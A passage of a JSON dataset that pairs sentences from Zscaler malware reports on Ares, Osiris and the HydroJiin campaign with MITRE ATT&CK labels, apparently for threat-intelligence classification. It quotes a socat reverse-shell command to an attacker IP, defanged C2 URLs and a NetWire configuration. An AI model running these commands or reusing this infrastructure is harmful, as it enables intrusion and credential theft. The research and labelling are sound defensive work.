0x4\u00a0attempt to set a registry value name *MSE* to zero and one, respectively, under the registry key HKEY\\_CURRENT\\_USER\\Software\\Microsoft\\CurrentVersion.", "labels": ["T1112", "T1112"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The registry value is not referenced elsewhere in Ares, so it may hint at a future use.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "One of the most significant modifications is the command 0x6 that downloads, decompresses, and maps a PE file into memory, and executes it.", "labels": ["TA0002", "T1105"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The first string is a pattern provided by the C2 server and the second is hardcoded to the string %APPDATA%\\Google\\report.zip.", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Zscaler ThreatLabZ has observed this Ares command being used to download a file from the URL http://mydynamite.dynv6[.]net/panel/upload/stealer.dll.", "labels": ["T1105"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The file is decompressed using the same compression algorithm as BMPack.", "labels": ["T1140"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares has code artifacts from the development of command 0x6.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The file is decompressed and mapped into memory using the same process as command 0x6.", "labels": ["T1140"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "After the file is mapped, the export CollectInfo is called with the parameters: %userprofile%Documents|*.txt|5 and NULL.", "labels": ["TA0010"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Zscaler ThreatLabZ has also identified Ares samples that contain\u00a0another unreferenced function that\u00a0loads a\u00a0VNC plugin by attempting to open a file located at d:\\scm\\Italy\\ares\\\\source\\_ob\\Binaries\\Release\\vnc.dll.cmp.", "labels": ["T1105"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Similar to the stealer plugin, the file is decompressed, mapped into memory, and the export MakeItStart is called.", "labels": ["T1140"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The MakeItStart export name is resolved similar to the other Ares functions using the same CRC64-based hash algorithm and comparing the result with F0U5R4R6Q8H1P3E5.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares then will terminate the VNC plugin by mapping the export name MakeItStop using the same process and comparing the result with the hash value C6P3T6Q8H1P3E5A8.", "labels": ["T1070"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The command 0xC is the most recent modification to Ares and only found in newer samples.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares Stealer", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares Stealer is downloaded by Ares\u00a0and invoked via the export name CollectInfo.", "labels": ["T1105"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The malware is written in C++ and uses the Boost and Curl libraries.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares Stealer has compilation artifacts showing that the Boost library was compiled in the directory d:\\scm\\Italy\\tools\\boost\\_1\\_74\\_0\\boost.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "This directory prefix is identical to the DarkCrypter\u2019s PDB path and the location where the Ares unreferenced\u00a0test functions attempt to load plugins from.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "This artifact along with the shared compression code suggests that the malware author likely has developed DarkCrypter, BMPack, Ares, and Ares Stealer.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The Ares Stealer export CollectInfo takes two parameters: a pipe-delimited string and a filename string.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The pipe-delimited string takes three arguments, which are used by the stealer\u2019s file grabber feature.", "labels": ["T1005"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The first parameter is the directory in which to start the file enumeration process, the second parameter is a search pattern, and the last parameter is the directory search depth.", "labels": ["T1005"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "An example command string observed from an Ares C2 server is %userprofile%|pass*.txt|5.", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "This command will search a victim\u2019s user profile directory up to five levels deep for text files that have the prefix pass.", "labels": ["T1005"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares Stealer collects detailed system information and harvests credentials for numerous applications including FTP clients, VPN clients, web browsers, instant messengers, and email clients.", "labels": ["T1082", "T1555"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "It can also steal files, cryptocurrency wallets, cookies, and credit cards.", "labels": ["T1005"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The stealer will attempt to extract information from the following applications:", "labels": ["T1005"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "* Electrum", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Osiris", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The Osiris version that has been used by this threat actor contains a number of new features since the original version that appeared in April 2018.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "* New beacon request format that includes information about the compromised system", "labels": ["TA0010"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "* Zlib compression to reduce the size of requests and responses (including web injects)", "labels": ["S0086", "T1189"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "* Ability to deploy TeamViewer on a compromised host", "labels": ["T1113"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "* Ability to steal a victim\u2019s Outlook contacts via [Nirsoft\u2019s OutlookAddressBookView](https://www.nirsoft.net/utils/outlook_address_book_view.html) utility", "labels": ["T1114"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "* Send spam emails to a victim\u2019s contact list", "labels": ["T1566"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The threat actor has an Osiris C2 server that is located at http://ylnfkeznzg7o4xjf[.]onion/kpanel/connect.php, which has been instructing infected systems to steal and exfiltrate web browser and email credentials.", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The web browser harvesting command\u00a0downloads a sqlite3 library from http://qqkzfkax24p4elax[.]onion/kpanel/upload/sqlite3.dll, which is a dependency to extract Google Chrome passwords.", "labels": ["T1555", "T1555"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "A second module for harvesting Firefox credentials from a 64-bit system is downloaded from http://qqkzfkax24p4elax[.]onion/kpanel/upload/ffc64.exe.", "labels": ["T1555"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The C2 is also serving a web inject configuration file, which targets clients at\u00a0German financial institutions with the URL patterns shown below:", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "When a victim browses to a website that matches one of these patterns, JavaScript code will be injected from the threat actor\u2019s domain https://securebankingapp[.]com/.", "labels": ["T1189"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The full list of web injects for this Osiris instance is shown [here](https://pastebin.com/tTxmjA1K).", "labels": ["T1189"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The threat actor has another active Osiris C2 server located at http://qqkzfkax24p4elax[.]onion/kpanel/connect.php.", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "This C2 server is also serving commands to exfiltrate credentials, but the web inject configuration file is blank.", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "However, the C2 server is also providing commands to extract a victim\u2019s email contact list using Nirsoft\u2019s OutlookAddressBookView, which is downloaded from the following locations:", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares is a new fork of the Kronos banking trojan that appears to be in the early stages of development.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The threat actor has invested significant resources in building DarkCrypter, BMPack, Ares, and Ares Stealer.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T0011 | Command and Control |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1053 | Scheduled Task/Job |", "labels": ["T1053"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1078 | Valid Accounts |", "labels": ["T1078"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1090 | Proxy |", "labels": ["T1090"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1185 | Man in the Browser |", "labels": ["T1185"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1219 | Remote Access Software |", "labels": ["T1219"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1497 | Virtualization/Sandbox Evasion |", "labels": ["T1497"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1552 | Unsecured Credentials |", "labels": ["T1552"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| T1592 | Gather Victim Host Information |", "labels": ["T1592"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The following IOCs can be used to detect Osiris and Ares infections.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| da767e6faf97d73997f397eae71b372a549dd6331bf8ec0ebd398ef8cfe9a47e | Osiris sample |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 5e7642e945bd05ecea77921cb3464b6da8db59e5ff38240608e3cbb44b07fb1d | Osiris sample |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 7498e37c332d55c14247ae4b675e726336a8683900d8fd1da412905567d2de4a | Ares sample |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| e5d624b7060c0e885abe11a0973a43a355c9930fc6912ff5eac83d1a9eec9c29 | Ares sample |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 035793d479c4229693fc6dcceaa639cd51ae89334b43e552b9c47a6dea68ce30 | Ares sample with embedded Startup module |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 94b084ea925990742f4eaaada1eef9a42c13066bf4f4c7a3b12a1509e32ff9e6 | Ares Stealer sample |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 09897c6ef88b9e9bc20917a2b47ec86ff2b727a2923678f5e2df6bb6437d3312 | Ares VNC plugin |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 896cebf465257f60347e58ffd7ec61629cf530956ef9b00e94f8b40ef9b30581 | DarkCrypter with second-stage BMPack and Osiris sample |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 956ae36f40d0d847daa00d7964906e7e9d1671d0f3f2e7d257d5a8d324388c31 | DarkCrypter sample with encrypted Ares payload |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 6c5dac9043b2f112543f3eca6503d4bcc70d762b47d75dcb85f9767c603de56f | DarkCrypter sample with compressed Ares TOR payload |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| b3348405cd0fa66661b46bc6cbab97b55708be26a2ed7a745e1632b46d1b3f41 | DarkCrypter sample with encrypted Ares payload |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 4044abad9a846e203f131c65b1f84bb2b79f94000d1d7be6c6d6a8e27ac76940 | BMPack sample with Osiris payload |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ylnfkeznzg7o4xjf[.]onion/kpanel/connect.php | Osiris C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://m3r7ifpzkdix4rf5[.]onion/kpanel/connect.php | Osiris C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://qqkzfkax24p4elax[.]onion/kpanel/connect.php | Osiris C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| https://securebankingapp[.]com | Osiris web inject domain |", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://vbyrduc537l5po3w[.]onion/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://wifoweijijfoiwjweoi[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiiqefmiir[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiilefmjim[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiieeelkif[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiiofelkkq[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiihfelikh[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiiffdkijh[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiigedliji[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiirfdmjks[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://ddkiitefkkju[.]xyz/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://mydynamite.dynv6[.]net/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| http://cabletv[.]top/panel/connect.php | Ares C2 URL |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "These rules are valid on unpacked Kronos, Osiris, and Ares binaries.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler TROJAN Ares Command Beacon\"; flow:established,to\\_server; content:\"POST\"; http\\_method; content:\"/connect.php?a=\"; http\\_uri; classtype:trojan-activity; rev:1;)", "labels": ["S0154", "T1059", "T1059"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "A look at HydroJiin campaign", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Zscaler ThreatLabZ recently came across an interesting campaign involving multiple infostealer RAT families and miner malware.", "labels": ["T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "We\u2019ve dubbed the campaign \u201cHydroJiin\u201d based on aliases used by the threat actor.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "We speculate that the malware author is running widespread campaigns involving different commodity and custom malware to steal information to sell in underground marketplaces.", "labels": ["TA0010"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Similar to other attacks outlined in the recent [ThreatLabZ State of Encrypted Attacks report](/blogs/security-research/2020-state-encrypted-attacks), this campaign serves as yet another example of the importance of continuous SSL inspection and [zero trust](/resources/security-terms-glossary/what-is-zero-trust) policies to prevent initial compromise as well as communication back to C&C servers.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "This campaign utilizes a variety of payloads and infection vectors from commodity RATs to custom malware, email spam, backdooring/masquerading as cracked software, and other lures.", "labels": ["T1566", "TA0003", "T1036"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Custom python-based backdoor deployed along with other RATs (Netwired and Quasar)", "labels": ["S0198", "S0262", "TA0003"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Python backdoor command checking for MacOS indicating possibility of more cross-platform functionality in the future.", "labels": ["T1059", "T1082"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Possibility of backdoored malware payload similar to [CobianRAT case](/blogs/security-research/cobian-rat-backdoored-rat)", "labels": ["S0338"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The infection starts with the delivery of a downloader that downloads\u00a0multiple payloads.", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "We could not confirm the delivery vector of this downloader but in we suspect the use of spam emails and\u00a0cracked software as we have seen in earlier campaigns.", "labels": ["T1566", "T1204"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Once the attackers achieve initial compromise, the downloader downloads three files:", "labels": ["TA0001", "T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Injector - Used as a loader to inject downloaded payloads into legitimate processes.", "labels": ["T1055", "T1055"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Netwired RAT - A commodity RAT malware used to control the infected system and steal information.", "labels": ["S0198", "TA0011", "T1041"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* DownloaderShellcode - Obfuscated Meterpreter-based shellcode to download further payloads.", "labels": ["T1027", "T1059", "T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "+ A Pyrome python backdoor is downloaded by this shellcode.", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "This will also download socat and xmrig miner, and finally xmrig miner downloads another RAT named Quasar.", "labels": ["S0262", "T1496", "T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "First, the downloader downloads a payload from pastebin and saves to %TEMP% path, with randomly generated names.", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The ***payload*** hosted on pastebin is encoded in base64 with the text string reversed.", "labels": ["T1132"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 2:*** *Downloading encoded payload from pastebin*", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The downloaded malware is an injector.", "labels": ["T1055"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "It downloads two more payloads and passes an argument to the first payload for injection.", "labels": ["T1105", "T1055"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 3:*** *Passing payloads to injector*", "labels": ["T1055"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Payloads are then downloaded from:", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* pastebin[.]com/raw/G0jcGs79 - NetwiredRC", "labels": ["S0198"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The payloads are also similarly string reversed after base64 encoding.", "labels": ["T1132"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "**1.1 NetWiredRC**", "labels": ["S0198"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The second payload in this case, hosted on pastebin, is a commodity malware known as NetWiredRC.", "labels": ["S0198"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "NetWiredRC is a publicly available RAT sold by World Wired Labs, active since at least 2012.", "labels": ["S0198"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Adversaries often use spam mails and phishing emails to distribute NetWiredRC. In the wild, it has been seen that NetWireRC is also used by APT threat actors.", "labels": ["S0198", "S0198", "T1566", "T1566"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Netwired\u2019s main focus is to gain unauthorized control on the victim machine, steal stored credentials,\u00a0and perform keylogging activity.", "labels": ["S0198", "TA0006", "T1056"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "This sample will communicate with *beltalus.ns1[.]name:8084* for further commands.", "labels": ["TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Configuration extracted from Netwire RAT::", "labels": ["S0198", "S0332"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "*{'Domains': ['beltalus.ns1[.]name:8084'], 'Proxy Server': 'Not Configured', 'Password': b'Volve', 'Host ID': b'Loader-%Rand%', 'Mutex': b'mKsWHTbK', 'Install Path': b'-', 'Startup Name': b'-', 'ActiveX Key': b'-', 'KeyLog Dir': b'%AppData%\\\\Logs\\_temp\\\\', 'Proxy Option': 'Direct connection', 'Copy executable': False, 'Delete original': False, 'Lock executable': False, 'Registry autorun': False, 'ActiveX autorun': False, 'Use a mutex': True, 'Offline keylogger': True}*", "labels": ["T1056"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The first of the two downloaded payloads is a [Metasploit Shikata Ga Nai Encoder](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) encoded shellcode capable of downloading another payload from: *r3clama[.]com/files/chrome.exe*.", "labels": ["T1105", "T1132", "T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The shellcode downloader downloads the following payloads:", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* *r3clama[.]com/files/socat.zip* : Socat tool", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* *r3clama[.]com/files/services.exe* : Miner Dropper", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "**1.2.1 PyInstaller Payload**", "labels": ["T1059"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The payload downloaded from *r3clama[.]com* is a Python-based malware bundled using pyinstaller.", "labels": ["T1105", "T1059", "T1059"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Persistence using Run key.", "labels": ["TA0003", "T1547"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Download, save and extract socat.zip from *https://r3clama[.]com/files/socat.zip.*", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Download monero miner exe from *https://r3clama[.]com/files/services.exe* which runs and further downloads QuasarRAT.", "labels": ["S0262", "T1105", "T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "* Start network communication thread.", "labels": ["TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "**Network Communication**", "labels": ["TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "The malware next communicates with C&C server at IP '193.218.118[.]190' and port 8266, first by sending a key to the server and then waiting for .json commands.", "labels": ["TA0011", "TA0011", "T1573"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 5 :*** Commands support by python backdoor", "labels": ["T1059"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Each of these commands is basically the same, and will download and save a payload from specified url.", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "2.The *url* \u00a0command also executes the file in addition to downloading it while the *upload* command does not.", "labels": ["TA0002"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "On receipt of this command, socat runs with following command line:", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "*\"socat OPENSSL:193[.]218[.]118[.]190:4442,verify=0 EXEC:{OS Command}\"*", "labels": ["TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "And sends hostname+\u2019$>\u2019 back to C&C over socket.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "In short, this command provides a reverse shell on the system to the attacker through socat.", "labels": ["TA0011"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "**1.2.1.1** [**Socat**](http://www.dest-unreach.org/socat/)", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Socat is an advanced multipurpose data relay tool.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "\u201csocat is a relay for bidirectional data transfer between two independent data channels.", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "-\u00a0 [README](http://www.dest-unreach.org/socat/doc/README)", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "**1.2.1.2 Miner Dropper**", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "It includes a monero miner binary and all the dll dependencies required by a monero miner executable.", "labels": ["T1496", "T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "It will drop and run the miner payload.", "labels": ["T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Then, it downloads and runs an additional payload, again from pastebin.", "labels": ["T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Here is the Miner Dropper sequence:", "labels": [], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Installs miner executable and dependency files.", "labels": ["T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 6:*** *Installing xmrig miner dependency files*", "labels": ["T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Waits for idle before starting miner.", "labels": ["T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 7:*** *Checks if system is Idle before starting miner*", "labels": ["T1057", "T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "CheckActive checks if the miner process is already running, if not then it is started by StartFiles.", "labels": ["T1057", "TA0002"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 8:*** *Running miner executable with required arguments.*", "labels": ["TA0002"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Downloads **Quasar RAT** payload from (https://pastebin[.]com/raw/khzLqKyN) after starting miner:", "labels": ["S0262", "T1105", "T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "***Figure 9:*** *Downloading another payload(QuasarRAT)*", "labels": ["S0262", "T1105"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "This miner could be the **MinerGate Silent Miner** sold on the threat actor\u2019s malware shop.", "labels": ["T1496", "T1496"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "If our assumption is true, there is another possibility of that miner being backdoored, similar to an old case of [Cobian RAT](/blogs/security-research/cobian-rat-backdoored-rat), piggybacking on client malware operators to distribute his own RATs.", "labels": ["S0338", "T1496", "TA0003"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "**1.2.1.2.1 QuasarRAT**", "labels": ["S0262"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "QuasarRAT has been active since at least 2015.", "labels": ["S0262"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "Quasar is an open-source project written in .Net framework and freely available to the public.", "labels": ["S0262"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "It has been used in various campaigns from mass spam campaigns to targeted attacks.", "labels": ["T1566"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "**Configuration of QuasarRAT**", "labels": ["S0262"], "document": "zscaler_2021-04-14_look-hydrojiin-campaign"}, {"sentence": "C&C : 